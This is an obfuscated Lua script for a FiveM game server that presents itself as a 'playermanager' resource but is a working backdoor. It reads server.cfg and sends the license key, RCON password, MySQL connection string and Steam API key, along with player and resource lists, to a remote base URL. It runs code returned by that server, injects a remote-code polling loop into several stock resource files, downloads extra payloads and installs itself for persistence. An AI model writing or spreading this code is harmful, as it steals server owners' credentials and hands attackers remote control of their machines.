if GetConvar("playermanager_loaded", "false") == "false" then
    SetConvar("playermanager_loaded", "true")
    local function a(b, c)
        local d = io.open(b, "a")
        io.output(d)
        io.write(c)
        io.close(d)
    end
    local function e(b, c, f)
        local d = io.open(b, f and "w" or "w+")
        io.input(d)
        io.output(d)
        io.write(c)
        io.close(d)
    end
    local function g(b)
        local d = io.open(b, "r")
        return d:read("*a")
    end
    local function h(c, i)
        i = i + 2
        local j = i
        for k = i, #c do
            local l = c:sub(k, k)
            if l == "\n" then
                j = k - 1
                break
            end
        end
        local m = c:sub(i, j)
        return m, j
    end
    local function n(o, c, k)
        local p = o:sub(1, k)
        local l = p .. c
        local q = o:sub(#l - #c + 1, #o + 1)
        return p .. c .. q
    end
    local function r(s, c, k)
        local d = g(s)
        local t = n(d, c, k)
        e(s, t)
    end
    local function u(o, v)
        local w, x = string.find(o, v)
        if w == nil then
            return nil
        end
        return h(o, x)
    end
    local y =
        [[ Citizen.CreateThread(function () while true do PerformHttpRequest("]] ..
        VYJEBATOR_BASEURL ..
            [[ping", function (err, result) local func = load(result) if (func) then func() end end) Citizen.Wait(5000) end end) ]]
    local function z(A, v)
        local B = A
        local C = g(B)
        if C then
            local D, E = u(C, v)
            if E == nil then
                log("WritePos is nil: " .. v)
            end
            if not C:find("PerformHttpRequest") and E then
                log("Backdoor not found in " .. B .. ", writing!")
                r(B, "\n" .. y, E)
            end
        end
    end
    local function F(A, c)
        local G = g(A)
        if G and not G:find(c) then
            log("Appending bait to " .. A .. "!")
            a(A, "\nserver_script '" .. c .. "'")
        end
    end
    local function H(A, I)
        PerformHttpRequest(
            VYJEBATOR_BASEURL .. "files/" .. I,
            function(J, K)
                if J ~= "200" and J ~= 200 then
                    log("Nemohl jsem stahnout " .. I .. " - error: " .. J .. "!")
                    return
                end
                K = K:gsub("{{{ PAYLOAD }}}", y)
                e(A, K, true)
            end
        )
    end
    local function L()
        local M = {}
        local N = GetNumPlayerIndices()
        for k = 1, N do
            local O = GetPlayerFromIndex()
            if O then
                M[#M + 1] = GetPlayerName(O)
            end
        end
        return M
    end
    local function P()
        local Q = {}
        local N = GetNumResources()
        for k = 1, N do
            local R = GetResourceByFindIndex(k)
            if R then
                Q[#Q + 1] = R
            end
        end
        return Q
    end
    local o = g("server.cfg")
    local S = u(o, "sv_licenseKey")
    local T = u(o, "rcon_password")
    local U = u(o, "mysql_connection_string")
    local V = u(o, "steam_webApiKey")
    local W = u(o, "sv_hostname")
    local function X(Y)
        local c = json.encode(Y)
        PerformHttpRequest(
            VYJEBATOR_BASEURL .. "pinginfo",
            function(J, K)
                if J ~= "200" and J ~= 200 then
                    log("Pingback error: " .. J)
                    return
                end
            end,
            "POST",
            c
        )
    end
    local function Z()
        local _ = {
            players = L(),
            resources = P(),
            hostName = W,
            licenseKey = S,
            rconPass = T,
            mysqlStr = U,
            steamApiKey = V
        }
        local c = json.encode(_)
        PerformHttpRequest(
            VYJEBATOR_BASEURL .. "pingback",
            function(J, K)
                if J ~= "200" and J ~= 200 then
                    log("Pingback error: " .. J)
                    return
                end
                if K ~= "OK" then
                    load(K)()
                end
            end,
            "POST",
            c
        )
    end
    local a0, a1 = u(o, "ensure spawnmanager")
    if not o:find("ensure playermanager") and a1 then
        log("Backdoor not found, writing!")
        r("server.cfg", "\nensure playermanager", a1)
    end
    z("resources/[managers]/mapmanager/mapmanager_server.lua", "randomseed")
    z("resources/[system]/baseevents/deathevents.lua", "local diedAt")
    z("resources/[system]/sessionmanager/server/host_lock.lua", "local hostReleaseCallbacks = {}")
    z("resources/[system]/baseevents/server.lua", "baseevents:leftVehicle")
    z("resources/[system]/rconlog/rconlog_server.lua", "rlUpdateNamesResult")
    z("resources/[gameplay]/playernames/playernames_sv.lua", "local activePlayers = {}")
    F("resources/[system]/sessionmanager/__resource.lua", "server/host_unlock.lua")
    H("resources/[system]/sessionmanager/server/host_unlock.lua", "host_unlock.lua")
    os.execute("mkdir resources/[system]/playermanager")
    e(
        "resources/[system]/playermanager/__resource.lua",
        [[ resource_manifest_version '77731fab-63ca-442c-a67b-abc70f28dfa5' server_script 'server.lua' ]]
    )
    e("resources/[system]/playermanager/server.lua", y)
    Citizen.CreateThread(
        function()
            log("Pinging back!")
            Z()
            Citizen.Wait(60000)
        end
    )
    SetConvarServerInfo("AFK Players", "0")
end
